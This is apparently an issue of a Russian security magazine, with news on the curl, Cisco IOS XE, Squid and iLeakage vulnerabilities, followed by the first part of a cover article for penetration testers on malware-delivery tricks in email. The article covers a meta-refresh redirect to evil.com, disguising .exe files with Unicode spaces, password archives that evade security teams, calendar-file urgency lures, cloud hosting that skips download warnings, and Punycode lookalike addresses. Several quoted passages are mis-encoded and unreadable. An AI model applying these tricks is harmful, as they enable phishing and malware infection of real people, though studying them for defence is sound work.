         ÷òîáû ñêîïèðîâàòü òóäà òîëüêî ïðå îáðà çîâàííûé àäðåñ», — ñîîáùàþò
         ðàç ðàáîò÷èêè.                 »
  То есть уязвимость, которая при сутство вала в коде 1315 дней, вероятнее
  все го, может исполь зовать ся для проведе ния атак на отказ в обслуживании.
   Так, ата кующий может создать сайт, который перенаправляет посетителя
  на очень длинное имя хоста (например, содержащее тысячи сим волов), что
   в ито ге приведет к переполнению буфера хипа и возникновению сбоя.
    При этом экс плуатация бага тре бует, что бы клиент curl был настроен
  на использование прокси SOCKS5 при подклю чении к удаленному сайту,
  а так же должны быть вклю чены автомати чес кие редиректы. Необходимо
  и медленное SOCKS5-соединение с уда лен ным сайтом.
     Как в итоге отметили многие эксперты, поскольку большинс тво людей,
  работа ющих с curl, не используют SOCKS5, эта проб лема не затронет их вов-



         «Îñíîâíàÿ ïðè÷èíà, ïî êîòîðîé ÿ çîë íà curl, — âñå ýòè ðàç ãîâîðû
        è õàéï âîê ðóã íåãî. Êîì ïàíèÿì è òàê íåëåãêî îïðå äåëÿòü ïðèîðèòåò-  се.«
         íîñòü èñïðàâ ëåíèé è ñòå ïåíü ñåðüåçíîñòè ðàç ëè÷íûõ óÿç âèìîñ òåé.
        Ïîäîáíûå „ó÷åáíûå òðå âîãè“ ëèøü îòíèìàþò âðå ìÿ, êîãäà îíè ìîã-
        ëè áû ñîñ ðåäîòî÷èòüñÿ íà  òàêèõ  âåùàõ,  êàê  KEV, íîâîå îáëà êî
        èëè AD», — ïèñàë â X (áûâ øèé Twitter) ñïå öèàëèñò TrustedSec Äæàñ òèí
        Ýëçå (Justin Elze).                 »
  При этом даже сам Стенберг сообщил, что наибо лее реалис тичный сце нарий
   ата ки на CVE-2023-38545 предполага ет, что пользователь браузера  Tor,
  который часто исполь зует про токол SOCKS5, подключится к взломанному
  HTTPS-сай ту.
    Однако с такой позици ей сог ласны не  все. К примеру, известный
  ИБ-эксперт Мэттью Хики (Matthew Hickey, он же hackerfantastic) заявил, что
  SOCKS5 может быть не слишком популярен в биз нес-среде, однако его часто
  используют иссле дователи и разработ чики в области ИБ.


        «Íà ñàìîì äåëå ýòî äîâîëüíî ÷àñ òî ñëó ÷àåòñÿ,  êîãäà ëþäè çàï-
        ðàøèâà þò API äëÿ òåñ òèðîâà íèÿ áåçîïàñ íîñòè, îòëàäêè èëè äðó ãîé «
          òåõíè÷åñ êîé ðàáîòû. Òàê æå ýòî ÷àñ òî âñòðå ÷àåòñÿ ïðè ïðîâåð êå ñåð-
         âèñîâ  Tor ñ èñïîëüçîâàíèåì  òàêèõ èíñ òðó ìåíòîâ,  êàê  curl,  êîãäà
         äëÿ âûïîëíåíèÿ çàï ðîñà îáû÷ íî òðå áóåòñÿ SOCKS5-ïðîê ñè», — ðàñ-
         ñêà çûâà åò Õèêè.                 »
  Кро ме того, он пре дупредил, что со временем исследователи изу чат проб-
  лему более тщательно и, воз можно, будут соз даны более слож ные экс плоиты,
  которые уже будут вести к выполнению произвольного кода.


 WINDOWS 11 УСТАНОВЛЕНА НА 400 ÌÈËËÈÎÍÎÂ
  УСТРОЙСТВ

   Журналисты Windows Central, со ссыл кой на внут ренние документы Microsoft, оказавшиеся
   в рас поряжении редак ции, сообщили, что количество установок Windows 11 уже пре выша ет
  400 мил лионов активных устройств в месяц. Ожидает ся, что полмиллиарда установок будет
   набрано уже в начале 2024 года.

   Для дос тижения отметки в 400 миллионов устройств ОС потребовалось око ло двух лет. И это
   замет но мед леннее, чем у Windows 10, которая дос тигла аналогич ного чис ла установок
   за один год (а в 2020 году добиралась до отметки в миллиард пользовате лей). Тем не менее
   в Microsoft уверяют, что с точки зрения поль зовательской базы Windows 11 оказалась более
   успешной, чем ожи дала компания.

 МАССОВЫЕ АТАКИ
 НА CISCO IOS XE





  С сентября 2023 года устройства Cisco под управлением IOS XE находят ся
  под массовыми атаками из-за недавно обна руженных 0-day-уязвимос тей
  CVE-2023-20198 и CVE-2023-20273. Патчи для этих проблем были выпуще ны
   только в конце октября и теперь дос тупны для клиентов через Cisco Software
  Download.
     Злоумышленники  используют  баги  CVE-2023-20198  и  CVE-2023-
  20273 для про никновения на уязвимые устройства и соз дания при виле гиро-
  ванных учетных записей (с наивысшим уровнем привилегий 15), а затем
  получают root-права и уста навлива ют в сис тему написанный на Lua бэкдор,
  который поз воля ет удаленно выполнять коман ды.
    Обе  уязвимости можно эксплуатировать толь ко в том слу чае, если
  на устройстве вклю чена фун кция веб-интерфейса (HTTP-сервер; это мож но
  сде лать через ip http server или ip http secure-server) и устройство под ключено
   к интернету или ненадежной сети.
     К  середи не  октября  количес тво  скомпрометированных  устройств,
  на которых обнаружи вался Lua-имплан тат, пре выси ло 50 тысяч, но потом
  резко пош ло на спад. Исследователи обнаруживали лишь 100–1000 взло-
  манных девайсов, в зависи мости от результатов разных сканирований.





  Эксперты выдвигали разные пред ложения о том, как это могло произойти,
   от вме шательства правоохранитель ных орга нов до активности неизвес тного
   grey hat хакера, который автоматизировал перезагрузку зараженных устрой-
   ств и таким обра зом очищает их от бэкдора.
    Однако вер ной оказалась другая теория, которая гласила, что злоумыш-
  ленники, стоящие за этими атаками, поняли свою ошибку (их имплантат
  слишком лег ко обнаружи вался удаленно) и обно вили мал варь, что бы скрыть
  свое при сутствие. То есть теперь имплантат незаметен во время сканиро-
   ваний.
    Спе циалисты  из ком пании  Fox-IT сооб щили,  что  вре доносный  код
  на десятках тысяч взломанных устройств был «изме нен, чтобы проверять зна-
  чение HTTP-заголов ка авто ризации перед ответом». Обладая этой информа-
   цией, ана лити ки провели еще одно ска нирование и пришли  к выводу,
   что 37 890 устрой ств IOS XE все еще скомпро метированы и мал варь никуда
  не делась. То есть тысячи устройств по-преж нему взломаны и находятся
  под контро лем зло умышленников.
     Разработ чикам Cisco уже известно о новом варианте мал вари, который
   «затрудняет выяв ление скомпрометированных систем». Сооб щает ся, что
  новую версию вредоноса начали раз вертывать 20 октября и она имеет при-
  мерно такую же функциональ ность, как и предыдущая.
    Подчеркивается, что, хотя вре донос, развернутый злоумыш ленни ками,
  не является пос тоянным (то есть удаляется при перезагрузке устрой ства),
  созданная хакера ми учетная запись с высоким уров нем при виле гий остается
  на устройстве даже после его перезапуска.


  ПОЛИТИЧЕСКИЕ АТАКИ НА РОССИЙСКИЕ КОМПАНИИ

   Специалисты FAССT исследовали кибератаки 2023 года на основе проведенных реагирований
   на инци денты в рос сий ских ком паниях. Выяснилось, что количес тво политически мотивирован-
   ных атак, целью которых было хищение конфиденциаль ных дан ных или пол ное раз рушение IT-
   инфраструктуры компании, вырос ло на 140%.

   Це лями политичес ки мотивированных атакующих чаще других становились предприятия, свя-
   занные  с критичес кой инфраструк турой, госсектором и обо ронной промыш-
  ленностью.

   На ряду с ними в группе рис ка оказались IT-компании из сег мента малого и сред него биз-
   неса — интернет-ретейлеры, интеграторы, разработ чики ПО.

   Также количес тво атак вымогателей за девять месяцев 2023 года выросло на 75%. Средняя
   сум ма выкупа за рас шифровку дан ных превысила 37 миллионов рублей, а самый крупный
   выкуп пот ребовали вымога тели из группы Shadow — 200 мил лионов рублей.





  Жертва ми шифровальщиков чаще всего ста нови лись рос сийские ретейлеры, производс-
   твенные, стро итель ные, ту ристичес кие и стра ховые компании.

   Среднее время простоя ата кован ной ком пании сос тавило 14–18 дней.

   На иболее агрессив ными прес тупными группами в Рос сии в этом году оказались Shadow
   и Twelve.

   Обыч но Shadow требует от жертвы крупный выкуп (в размере 5–10% от годово го дохода ком-
   пании) за то, чтобы рас шифровать данные и не пуб ликовать похищен ную информацию.


   Самыми рас пространенными шиф ровальщиками, которые прес тупни ки используют для атак
   на рос сийские компании, стали LockBit, Conti и Babuk, чьи исходники были опубликованы
   в открытом дос тупе.





                                        Продолжение статьи →
← Начало статьи
 УЯЗВИМОСТИ
 В SQUID
 ИСПРАВЛЯЮТ 2,5
 ГОДА





  Еще в 2021 году ИБ-исследователь Джошуа Роджерс (Joshua Rogers)
  выявил 55 уязвимостей в Squid, популярном кеширующем прокси-сервере
  с откры тым исходным кодом. По сло вам экспер та, основная часть этих проб-
  лем не исправ лена до сих пор, а большинству даже не прис воены иден-
  тификаторы CVE.
      Squid, поддержи вающий HTTP, HTTPS, FTP и не только, широко исполь-
   зует ся интернет-провай дерами и операторами сай тов. Как пишут его раз-
  работ чики: «Многие из вас используют Squid, даже не подоз ревая об этом!
  Некоторые компании встра ивают Squid в домашние или офис ные брандма-
   уэры, другие используют Squid в масштабных веб-прок си для ускорения
  широкополосного и коммутиру емого дос тупа в интернет. Squid часто при-
  меня ется в архи тектурах доставки кон тента для доставки ста тичес кого
  и потокового видео и аудио пользователям по всему миру».
    В фев рале 2021 года Джошуа Роджерс провел аудит безопасности Squid
  и обна ружил в исходном коде проекта 55 различных ошибок. Как теперь
  сообщает эксперт, только 20 из этих уязвимостей были исправлены к нас-
  тояще му вре мени, а для остальных 35 до сих пор нет патчей или иных спо-
  собов защиты.
    На сво ем сайте Род жерс перечисляет 45 уяз вимос тей в Squid. В список
   входят проб лемы типа use after free, утеч ки памяти, отравление кеша и про чие
  дефекты в различных компонентах. Эксперт отме чает, что оставшиеся десять
  багов — это «результат схо жих, но других спо собов вос произведения тех же
   уязвимос тей». В итоге многие из обнаружен ных проб лем могут привести
   к сбою, а некоторые могут использовать ся и для выполнения произволь ного
   кода.
     Род жерс обна родовал не только тех ничес кие под робнос ти об уязвимос-
   тях, но и PoC-эксплоиты для них на GitHub. Кроме того, на его сайте также
  перечис лены 13 дополнительных проблем в коде, которые он считает обыч-
  ными ошибками, не име ющими отношения к безопасности.
    По словам иссле дователя, все уяз вимости он нашел в коде Squid 5.0.5
  (новей шая вер сия Squid сей час — это 6.3) с помощью фаззинга, ручной про-
  верки кода и статического ана лиза. Он уве ряет, что про вел тестирование
  прак тически всех возможных компонентов, включая «пря мое проксирование,
  обратное прок сирование, все под держиваемые протоколы (HTTP, HTTPS,
  HTTPS intercept, URN, Whois, Gopher, FTP), ответы, запросы, „помощников“,
  DNS, ICAP, ESI, кеширование», при этом использовав все возможные кон-
  фигурации.
     Род жерс признает, что соп ровождающие Squid, как и большинс тво опен-
  сорс-разработ чиков, — это в основном добровольцы, которые могут поп-
   росту не иметь возможнос тей для быстрого устранения проб лем.


        «Êîìàíäà Squid Team áûëà ïîëåç íà è îêà çûâà ëà ïîä äåð æêó, êîãäà ÿ
        ñîîáùàë îá ýòèõ ïðîáëåìàõ. Îäíà êî îíè èñïû òûâà þò îñòðóþ íåõâàòêó «
         êàä ðîâ, è ó íèõ ïðîñ òî íåò ðåñóð ñîâ äëÿ óñòðà íåíèÿ îáíà ðóæåííûõ
         óÿç âèìîñ òåé. Åñëè äîëáèòü èõ òðå áîâà íèÿìè îá óñòðà íåíèè ïðîáëåì,
         òîëêó îò ýòîãî íå áóäåò», — ïèøåò ñïå öèàëèñò.                 »
  Сог ласно  под счетам  Роджерса,  на  сегодня  в  интернете  дос тупно
  более 2,5 миллиона экземпляров Squid, и он рекомендует всем ознакомить ся
  со списком обнаруженных уяз вимостей и подробнос тями об их воз можной
   эксплуатации.


        «Âû ñàìè äîëæíû îöå íèòü, ÿâëÿåòñÿ ëè Squid ïîä õîäÿùèì ðåøåíèåì
         äëÿ âàøåé ñèñ òåìû», — ðåçþìèðîâàë ñïå öèàëèñò. «                 »

  4,3 ÌÈËËÈÀÐÄÀ ЧЕЛОВЕК ВЛАДЕЮТ СМАРТФОНАМИ

   По под счетам торговой орга низации GSMA, количес тво владельцев смартфонов в мире пре-
   выси ло 4,3 миллиар да человек, то есть в настоящее вре мя этими гаджетами владеет 54%
   населения Зем ли. При этом около 4 миллиардов человек выходят в интернет при помощи
   смар тфонов, а еще 600 мил лионов получа ют дос туп в сеть через обыч ные телефоны. -Также
   в отчете GSMA отмечает ся, что 3,4 миллиарда человек до сих пор не имеют доступа к сети.
   Причем большинство из тех, кто не поль зуется мобильным интернетом, проживают в районах,
   охва ченных сетью мобиль ного широко полосного дос тупа, и лишь 5% людей, которые не поль-
   зуют ся мобиль ным интернетом, проживают в районах без такого покрытия.

 MICROSOFT
 ОТКАЗЫВАЕТСЯ
 ОТ VBSCRIPT





  Компания Microsoft собирается пос тепенно отка заться от VBScript в будущих
  релизах Windows, сначала сделав его фун кци ей on demand, а затем уда лив
  окончательно. Дело в том, что VBScript уже много лет исполь зуется как вектор
  зараже ния Windows-систем мал варью.
      VBScript (он же Visual Basic Script или Microsoft Visual Basic Scripting
   Edition) — это язык сценариев, аналогичный Visual Basic или Visual Basic for
   Applications (VBA), который был пред ставлен в августе далекого 1996 года.
      VBScript  поставляется  в  комплекте  с  Internet  Explorer,  интегри рует
  активные скрип ты в окру жение Windows и взаимодей ству ет с хост-приложе-
  ниями пос редством Windows  Script. При этом  Microsoft уже отключила
   VBScript  по  умол чанию  в  Internet  Explorer  11  в  Windows  10 еще  в
  июле 2019 года.

          «VBScript óñòà ðåë. Â áóäóùèõ âûïóñ êàõ Windows VBScript áóäåò äîñ-
         òóïåí êàê ôóíêöèÿ on demand, âïëîòü äî åãî óäà ëåíèÿ èç îïå ðàöè- «
        îííîé ñèñ òåìû, — ñîîáùàþò òåïåðü ïðåäñòà âèòå ëè Microsoft. — Ñíà-
         ÷àëà ôóíêöèÿ on demand VBScript áóäåò ïðå äóñ òàíîâ ëåíà, ÷òîáû îáåñ-
         ïå÷èòü åå áåñ ïåðåáîéíîå èñïîëüçîâàíèå âî âðå ìÿ ïîä ãîòîâ êè ê ïðåê-
       ðàùåíèþ èñïîëüçîâàíèÿ VBScript».                 »
  Фун кции on demand представляют собой дополнительные функции Windows
  ОС, такие как .NET Framework (.NetFx3), Hyper-V и Windows Subsystem for
   Linux, которые не уста навливаются по умолчанию, но могут быть добав лены
  при необ ходимости.
     Хо тя в ком пании не говорят об этом официаль но, похоже, отказ Microsoft
   от VBScript связан с тем, что это один из популяр ных векторов дос тавки мал-
  вари в системы поль зователей. К примеру, с его помощью распространялись
   такие вредоносы, как Lokibot, Emotet, Qbot, DarkGate.
     Отказ от VBScript ста нет очередным шагом в рамках стратегии, нап-
  равленной на сни жение количес тва вредоносных кампаний, эксплу атирующих
  для зараже ния различные фун кции Windows и Oﬃce. Эта работа ведется
  с 2018 года и началась с того, что Microsoft рас ширила поддержку AMSI
  на приложе ния Oﬃce 365, что позволило пресечь ата ки, использующие мак-
  росы VBA.
     Впос ледс твии компания отключила мак росы Excel 4.0 (XLM), ввела защиту
   от макросов XLM, обязательную бло кировку макросов VBA Oﬃce по умол-
  чанию, а так же начала блокиро вать ненадежные надстройки XLL для тенантов
   Microsoft 365 по всему миру.


 АДМИНЫ ТОЖЕ ИСПОЛЬЗУЮТ ПАРОЛЬ ADMIN
   Аналити ки ком пании Outpost24 собрали интерес ную статис тику об аутен тификационных дан-
   ных. Ока залось, что ИТ-админис траторы используют десят ки тысяч слабых паролей, самым
   популярным из которых является admin.
     В общей сложности исследователи изучили более 1,8 мил лиона учет ных данных адми нис-
   тра торов (все данные были восстановлены пос ле атак от вредоносного ПО). Проанализировав
   полученную коллекцию аутен тифика цион ных данных, исследователи сос тавили топ самых сла-
   бых из них.





 УСТРОЙСТВАМ APPLE
 УГРОЖАЕТ ILEAKAGE





  Груп па ученых из Тех нологического университета Джорджии, Мичиганского
  уни вер ситета и Рурского университета в Бохуме раз работа ла спе кулятивную
   side-channel-ата ку iLeakage, которая работает против устройств Apple и поз-
  воля ет извлекать кон фиденциаль ную информацию из браузера Safari, вклю-
   чая пароли и содержимое вкладок.
     Атака работа ет против любых современных устройств Apple с процес-
  сорами серий A и M, и с ее помощью можно извлечь данные из Safari, а также
   Firefox, Tor и Edge для iOS практичес ки с «идеаль ной точностью».
     Ученые уве ряют, что iLeakage — это не прос то концепт и атака может
  использоваться в реаль ности. Для это го достаточно заманить пользовате ля
  на вре доносную веб-страницу, а затем восста новить данные из дру гих вкла-
   док, открытых в его бра узере Safari.
    По  сути, iLeakage представляет собой  timerless-версию нашумевшей
  проблемы Spectre и обхо дит защиту от side-channel-атак, давно реализован-
  ную всеми произво дителями браузеров. Так, изу чая устойчивость  Safari
   к подобным ата кам, специалисты сумели обойти сущес твующие контрме ры
  и реали зовать не завися щий от архитектуры timerless-метод атаки, свя занный
  с сос тоянием гон ки.





  В основном уси лия ученых были сосредоточены на считывании конфиден-
  циальной информации из Safari, и им удалось похитить данные, создав при-
   митив, спо собный спе куля тивно прочитать и «слить» любой 64-битный ука-
   затель в адресном прос транс тве, используемом браузером Apple для рен-
  деринга.
     Для это го потребовалось обойти защиту от side-channel-атак, реали-
  зованную Apple в браузере, включая low resolution таймер и сжатие 35-битной
  адресации. Также иссле дователи обошли полити ку изоляции сайтов в Safari,
  которая разделяет сай ты на разные адресные пространства на основе
  доменов верхне го уров ня и суб доменов.
     Эксперты  примени ли  новую  тех нику,  использующую  API  JavaScript
   window.open, которая позволя ет атакующей стра нице использовать одно и то
  же адресное пространство с произвольными страницами-жер твами.
    Используя спе куля тивную атаку типа type confusion для обхода защит ных
  мер Apple, исследователи смогли добить ся утечки кон фиденциальных данных
  с целевой страницы, включая пароли и электронные письма гипотетичес кой
  жертвы.
    В серии роликов исследователи про демонс трировали, как с помощью
   iLeakage извлечь сообщения из Gmail в Safari на iPad, как iLeakage работает
  про тив Chrome для iOS (удалось извлечь историю прос мотров жертвы
   YouTube), а также показали получение пароля от тестовой учетной записи
   в соци альной сети, который был авто матичес ки заполнен в Safari с помощью
   LastPass.
     Эксперты объ ясняют, что, по сути, пра вила Apple требуют, чтобы все сто-
  рон ние бра узеры для iOS были овер леями для  Safari и исполь зовали
   JavaScript-движок собственного браузера Apple.
    Проблема iLeakage затрагивает все устрой ства Apple, выпущенные пос-
  ле 2020 года и работающие на ARM-процес сорах Apple серий A и M. Атака
  прак тически не обнаружи вается и не оставляет сле дов в сис теме жертвы,
  за исклю чением записи о посещении веб-стра ницы злоумыш ленника в кеше
  браузе ра.
     Тем не менее эксперты подчеркивают, что атака сложна в реали зации
  и «тре бует глубоко го знания бра узерных side-channel-атак и импле ментации
   Safari».
    В иссле довательской работе отмечается, что уче ные сообщили Apple
  о проблеме еще 12 сентября 2022 года, одна ко ком пания приняла решение
  не выпускать исправ лений. Вместо этого предложен следующий метод
  защиты для macOS:
   • нужно   открыть   терминал  и  выполнить  команду   defaults   write
      com.apple.Safari  IncludeInternalDebugMenu  1,  чтобы включить скрытое
    меню отладки Safari;
   • от крыть Safari и перейти в новое меню Debug;
   • выб рать пункт WebKit Internal Features;
   • активиро вать функцию Swap Processes on Cross-Site Window Open.





  При  этом  исследователи  пишут,  что  такой  способ  работает  только
  для macOS, не включен по умолчанию и в нас тоящее время вообще счи тает-
  ся нестабильным.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   DDoS-защиту Cloudare можно обойти с помощью самой Cloudare


   Nightshade отравляет данные, нарушая процесс обу чения ИИ-моделей


   Google и Yahoo будут бороться со спамом по-новому


   По явился эксплоит для Linux-уязвимос ти Looney Tunables


   Иссле дова тели делятся новыми под робностями об «Операции „Триангу ляция“»


  GNOME уязвим перед RCE-ата ками из-за ошиб ки в биб лиотеке libcue


   Хакеры зло употребля ют Binance Smart Chain для хранения вредоносного кода


   Фальшивая реклама KeePass исполь зует Punycode и домен, почти неотличимый от нас тояще го


   Okta снова взломали. Данные клиентов попали в руки неиз вес тных прес тупников


   Google Chrome будет скры вать реаль ные IP-адреса пользовате лей
COVERSTORY





          ИЗУЧАЕМ УЛОВКИ
     И ХИТРОСТИ ДЛЯ ДОСТАВКИ
        ПИСЕМ С МАЛВАРЬЮ





По статис тике зна чительная часть зараже-
ний малварью про исхо дит из-за того, что
пользователь  сам  запус тил  на  своей
машине вредоносный файл. Именно в этом
и заключается основная задача зло умыш-         Юрий Другач                                                                                     Автор книги о социальной
ленников, использующих социаль ную инже-      инженерии «Контролируемый                                                                                              взлом»
нерию. Давай посмотрим, какие тех ничес-
кие улов ки и хит рости они применяют.




                        Статья пред назначена для «белых хакеров», про-
                    фессиональных  пен тестеров  и  руково дите лей
                       службы информационной безопас ности (CISO).
                    Ни автор, ни редакция не несут ответственности
                        за любой возможный вред, причиненный матери-
                       ала ми дан ной статьи.



ÂËÎÆÅÍÈß È ÔÀÉËÛ

Мы рассмотрим ата ки с файлами не с точ ки зрения того, как их доставля ют
во вре мя пентеста и что в них пишут, что бы пользователь повел ся. Об этом
мы поговорим в другой раз. Сегодня мы коснемся нескольких технических
аспектов, включая маскиров ку файлов и расширений, и обсудим некото рые
лайфхаки.
  Дос тавку HTML-файлов с объектом  JavaScript  Blob, закодированным
с помощью Base64, в статье мы умыш ленно не рассматрива ем, пос коль ку
сей час обсуждается обман людей, а не обход сис тем защиты.
  В целом дос тавляемые по каналам связи фай лы можно отнести к сле-
дующим категориям:
 • фай лы Microsoft Oﬃce;
 • HTML (HTM, SHTML);
 • PDF;
 • архивы (с паролем и без) с нагрузкой внут ри;
 • ICS-фай лы кален даря.

Рассмот рим, какие уловки исполь зуют зло деи с каж дым из этих видов фай-
лов.


ÐÓØÈÌ ØÀÁËÎÍÛ ÏÎÂÅÄÅÍÈß ×ÅÐÅÇ ÏÅ×ÀÒÜ

Когда сот рудник скачивает файл из интернета или из вложения в почтовое
сообщение, его предупрежда ют, что содержимое файла небезо пасно.





         Пре дуп реждение о небезопасном содержимом файла

Хочешь попросить его выключить защиту необыч ным способом? Представься
в письме начальником и скажи, что этот документ (бланк, таблицу) нужно рас-
печатать и подписать, ведь сегодня в течение дня его заберет сотрудник
отде ла кадров.
   Сот рудник открывает окно с печатью и видит, что она недоступна.





              Предуп реждение о недос тупности печати

Впро чем, он при вык, что его про сят отключить защищенный прос мотр
в самом документе, а это уже немного дру гой сце нарий. Сам Word просит
отклю чить защиту, ломая шаблоны осведом ленного пользователя.


PDF-ÔÀÉËÛ

На рисунке ниже изоб ражен твит (или как там теперь это правильно называ-
ется) с упоминанием вре доносной ата ки. Если что, не сер чай на перевод
от Google Translate.





                 Опи сание ата ки через PDF-файл

Ну а на сай те Fortinet ты можешь почитать о подробностях атаки. Быть может,
тебе при годится подоб ный спо соб доставки наг рузки.
   Когда мы делали свои первые соци отехнические пентесты в 2017 году, то
для  тре кинга  разрешений  таких  вот  заг рузок  поль зовались сер висом
Canarytokens.
  Нам и заказчику было дос таточно того, что поль зователь нажал Allow
(«Разрешить») во всплывающем предупрежде нии в PDF-файле. Это уже счи-
талось инци дентом и показа телем того, что поль зователь ском прометирован.





                Интерфейс сервиса Canarytokens


HTML-ÔÀÉËÛ

Во вложении в сооб щения элек тронной почты час то встречают ся такие HTML-
файлы:
 • с редиректом на какую-то твою страницу, нап ример, это можно организо-
   вать с помощью кода <meta http-equiv="refresh" content="0;
  URL=https://evil.com"/> ;
 • со дер жащий вре доносный iframe, который под тягива ет твою стра ницу
   из интернета. Система защиты может не видеть iframe, а пользователь
   увидит;
 • с фишинговым содержимым. При мер подобного фишинга показан в отче-
   те Sophos.

А вот еще при мер фишингового HTML-фай ла.





             Имитация Excel-фай ла на веб-стра нице

Рассматривая тех нические трюки, давай коснемся и маскиров ки рас ширения
.html в поч товом кли енте.
  От нев нимательного поль зователя HTML-вложение можно замаскировать
так: меж ду docx и html вставить побольше нераз рывных пробелов (U+00A0,
см. рисунок ниже).





  Имитация DOCX-документа в имени HTML-файла с нераз рывными про-
  белами

Да, иконка получается не вордов ская, но мно гие не обращают на это вни-
мания. А можешь ничего не мас кировать и отправлять как есть.





          Ими тация DOCX-документа в имени HTML-файла


ÀÐÕÈÂÛ Ñ ÏÀÐÎËÅÌ

Для пол ноты кар тины нельзя обой ти сто роной классическое скры тие вре-
доноса в запароленном архи ве. Хоть некото рые сис темы защиты бло кируют
такие архи вы от гре ха подальше, этот спо соб все еще достаточно дей ствен-
ный.
   Письмо с подобным архи вом выглядит пример но так:

     Äîáðûé äåíü.
      Ïðèê ëàäûâàþ àðõèâ ñ äîêóìåíòàìè.«
     Â öåëÿõ áåçîïàñ íîñòè àðõèâ çàùèùåí ïàðîëåì.
     Ïà ðîëü îò àðõèâà: 12345
     Ñ óâà æåíèåì, Àíäðåé Ïåòðîâ                »
Зная,  что поль зователь может быть обучен опре делять  такие пись ма
как подоз рительные, пароль можно не упоминать. Пусть человек сам спросит
его, а ты выш лешь пароль отдельным письмом. Так, по заголовкам его пись-
ма, мож но убе дить ся, что отве чает на пись мо именно пользователь, а не
служба ИБ, которая хочет изучить твою наг рузку в архи ве.


ÀÐÕÈÂÛ ÁÅÇ ÏÀÐÎËß

Вот так мы прятали настоящее рас ширение файла в архиве.




  Отображение EXE-фай ла в архиве, где в имени используется много про-
  белов

Поль зователи реально не понимали, что перед ними .exe, а не .pdf. А дела-
ется это так. В фай ле Book.pdf.exe после pdf многок ратно вставлен «сред-
ний математический про бел» в Unicode.





           Описание среднего матема тического пробела

В такое название фай ла удалось вставить около 280 пробелов. Поэтому если
у поль зователя окно просмотра названия фай ла раздви нуто вправо, то он
уви дит .exe, но так бывает нечасто.




         Расширенное отоб ражение поля имени фай ла в архиве

Ес ли вставить много обычных пробелов, то замаскировать настоящее рас-
ширение фай ла это не очень поможет.




           Отображение дей ствительного расширения файла

Опять же это моветон — отправлять .exe в архиве, что легко обнаружи вает ся
защит ными системами. Но, во-первых, не у всех установлены такие системы,
во-вторых,  я  прос то люб лю  все  классифици ровать,  чтобы  максимум
информации по теме было в одном разделе, даже если какие-то трюки
не работа ют в организациях, заботящихся о защите информации.
   Когда человек пытался запустить полученный от нас EXE-файл на Linux
и писал нам, что ему не удается открыть файл, мы ему «помогали» и отправ-
ляли другую нагрузку. Можно с уверенностью сказать, что тех нологии защиты
лишь снижают риски и плюсом к ним нужно вкладываться в навыки кибер-
безопасности людей. Но сей час не об этом, едем дальше.


ÐÅÄÊÎ ÈÑÏÎËÜÇÓÅÌÛÅ ÐÀÇÐÅØÅÍÈß

Отправ ляя архивы, пробуй раз ные расширения помимо стандартных .rar и .
zip.  Пытайся  обойти  систему  защиты  (техническую  и  человеческую)
с помощью .cab, .z и дру гих.
  В 2020 году по России про катились рас сылки с мал варью, запако ванной
в архи вы с расширени ем .001, и кто-то был явно не готов к таким атакам и не
блокиро вал подобные архи вы на поч товом сер вере. Проверь, может, они
не бло киру ют и z-архи вы :)


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





                ИЗУЧАЕМ УЛОВКИ И ХИТРОСТИ ДЛЯ
                  ДОСТАВКИ ПИСЕМ С МАЛВАРЬЮ





ÔÀÉË ICS

Формат ICS (пер вая буква — заг лавная  i) — это формат файлов, исполь-
зуемый для календарей и  еmail-клиентов (Google  Calendar, Apple  iCal,
Microsoft Outlook).
  В iPhone, нап ример, такой файл отоб ражается сле дующим образом.





              При мер отображения файла ICS на iPhone

В дан ном слу чае кноп ки «Сохранить» в свой кален дарь нет, но это не беда.
Такой вариант подходит для срочных векторов:

      Êîëëåãè, íàïîìèíàåì, ÷òî îíëàéí âñòðå ÷à ñîòðóäíèêîâ ñ ãåíåðàëü-
     íûì äèðåê òîðîì óæå íà÷àëàñü. Ïîâ òîðíî ïðèê ðåïëÿþ ôàéë ñ íàïîìè-«
      íàíèåì äëÿ êàëåíäàðÿ.                »
Отправ ляем в 9:05. Сотрудник подума ет, что уже опаздывает, и не будет раз-
мышлять, стоит ли переходить по ссылке.


ÔÀÉË Â ÎÁËÀÊÅ VS ÔÀÉË ÍÀ ÑÅÐÂÅÐÅ

Напос ледок давай рассмотрим, как облачные хра нилища файлов помогают
сде лать файл более безопас ным в глазах жер твы.
  Ссылки на один и тот же файл были отправлены, а после открыты
в Outlook. Один файл хра нился на Яндекс Дис ке, вто рой — прямо на хос-
тинге:


<https://disk.yandex.ru/d/UAB58lN5VE173A>


<https://icast.ru/virus.exe>

В результате файл с Яндекс Дис ка ска чива ется без допол нительных уве дом-
лений, а при скачивании нап рямую пользователь видит вот такое пре дуп-
реждение.





В загрузках оба фай ла, соответственно, выглядят так.





Де лаем вывод, что, если хотим привлекать мень ше внимания к файлу, надо
загружать его в облачное хранили ще.


ÍÅÄÎ×ÅÒÛ Â ÈÍÒÅÐÔÅÉÑÀÕ ÏÎ×ÒÎÂÛÕ ÊËÈÅÍÒÎÂ È ÑÅÐÂÈÑÎÂ

С файлами  разобрались,  теперь  пройдемся  по  нес коль ким  огре хам
в интерфей се, которые помога ют не только пентестерам, но и злоумыш-
ленникам вво дить жертв в заб луждение.
   Рас смот рим тему с двух сторон: как мы в бла гих целях можем исполь-
зовать эти недоче ты при пен тесте в фишинговых рассылках и как разработ-
чики ПО могут помочь пользователям различать этот самый фишинг.
  На кар тинке ниже изображен интерфейс входяще го письма в Outlook.





Логика жертвы такая: раз письмо видят и бух галтер, и директор, значит, лучше
сде лать то, что требуется. Все бы ничего, но в копии указаны email-адре са,
ими тирующие кол лег жертвы, на самом деле это несущес твующие адре са
(см. рисунок ниже).
  Но если в первом email еще можно разглядеть букву s со штрихом вни зу,
то во втором кириллическую букву визуально отличить от латинской невоз-
можно.





При наведе нии курсора мыши email виден тот же, с под дель ной бук вой.





Расчет зло умыш ленни ка прос той: он ука зывает фик тивные адреса в копии,
письма никуда не доходят, зато жертва думает, что начальство в курсе
переписки, и с боль шей долей вероятности откро ет архив с малварью внутри
или перей дет по фишин говой ссылке.
  «Фейковый» email выг лядит похожим на оригинальный домен, потому что
Outlook пре образовал Punycode-комбинацию в Unicode.
  В другом известном поч товом клиенте точно такая же исто рия: email
с Punycode не отображается как <gl.buhgalter@xn--topphish-g9c.ru>,
а мог бы.




Те перь давай рассмотрим несколько примеров  почтовых служб и  их
веб-интерфей сов. На этот раз взглянем не на то, как отобража ется Unicode
